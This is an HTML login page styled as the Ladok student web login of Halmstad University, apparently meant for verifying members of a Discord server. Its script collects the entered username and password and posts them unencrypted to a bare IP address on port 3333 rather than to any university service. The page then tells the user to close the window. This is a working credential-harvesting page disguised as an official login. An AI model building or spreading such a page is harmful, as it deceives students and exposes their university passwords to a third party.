<html class="gr__idp_hh_se">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="device:width,initial-scale=1.0" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <title>Web Login Service</title>
    <link
      rel="stylesheet"
      href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css"
      integrity="sha384-1q8mTJOASx8j1Au+a5WDVnPi2lkFfwwEAa8hDDdjZlpLegxhjVME1fgjWPGmkzs7"
      crossorigin="anonymous"
    />
    <script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https//oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  </head>
  <body data-gr-c-s-loaded="true">
    <div class="container">
      <div class="row">
        <div
          class="col-sm-6 col-sm-offset-3 col-md-5 col-md-offset-3 col-lg-4 col-lg-offset-4"
        >
          <div class="account-wall" id="formthing">
            <h1 class="text-center login-title">
              Login to Ladok student web www.student.ladok.se
            </h1>
			<!--<img class="profile-img" src="/idp/images/hh-logotyp.png" alt="" />-->
	
            <form
			  method="post"
			  id="form"
            >
              <div class="row">
                <div class="col-sm-12 col-md-10  col-md-offset-1 ">
                  <div class="form-group">
                    <div class="input-group">
                      <span class="input-group-addon">
                        <i class="glyphicon glyphicon-user"></i>
                      </span>
                      <input
                        class="form-control input-lg"
                        title="Username"
                        placeholder="Username"
                        name="username"
                        type="text"
                        autofocus=""
                        autocomplete="off"
                        value=""
                      />
                    </div>
                  </div>
                  <div class="form-group">
                    <div class="input-group">
                      <span class="input-group-addon">
                        <i class="glyphicon glyphicon-lock"></i>
                      </span>
                      <input
                        class="form-control input-lg"
                        placeholder="Password"
                        title="Password"
                        name="password"
                        type="password"
                        value=""
                      />
                      <input id="ID" type="hidden" name="ID" value=""/>
                    </div>
                  </div>
                  <div class="form-group">
                    <button
                      class="btn btn-lg btn-primary btn-block"
					  type="button" name="submit" value="submit"
					  id="submit" 
					  >
                      Login
                    </button>
                  </div>
                  <a href="http://www.hh.se/datorkonto" class="need-help"
                    >I don´t have an Account or password</a
                  ><span class="clearfix"></span>
                </div>
              </div>
			</form>
			<script>
					const urlParams = new URLSearchParams(
					  window.location.search
					);
					const id_value = urlParams.get("ID");
					document.getElementById("ID").value = id_value;
				  </script>
			<script>
					$(document).ready(function(){
						
						// click on button submit
						$("#submit").on('click', function(){
            $("#formthing").hide();
            $("#loggedIn").show();
							var formData = JSON.stringify($("#form").serializeArray());
							// send ajax
							$.ajax({
								url: 'http://158.174.180.57:3333/register', // url where to submit the request
								type : "POST", // type of action POST || GET
								dataType : 'json', // data type
								data : formData, // post data || get data
								success : function(result) {
									// you can see the result from the console
									// tab of the developer tools
									console.log(result);
								},
								error: function(xhr, resp, text) {
									console.log(xhr, resp, text);
								}
							})
						});
					});
				
				</script>
          </div>
          
        </div>
      </div>
      <div class="loggedIn" id="loggedIn" style="display:none">
        <h1 class="text-center login-title" >
          You can now close this window. If you entered the right information you will soon be authenticated on discord. If not, deselect the checkmark in #välkommen and try again.
        </h1>
      </div>
    </div>
  </body>
  <div>
    <div class="gr_-editor gr-iframe-first-load" style="display: none;">
      <div class="gr_-editor_back"></div>
      <iframe class="gr_-ifr gr-_dialog-content"></iframe>
    </div>
  </div>
  <grammarly-card><div></div></grammarly-card
  ><span class="gr__tooltip"
    ><span class="gr__tooltip-content"></span><i class="gr__tooltip-logo"></i
    ><span class="gr__triangle"></span
  ></span>
</html>
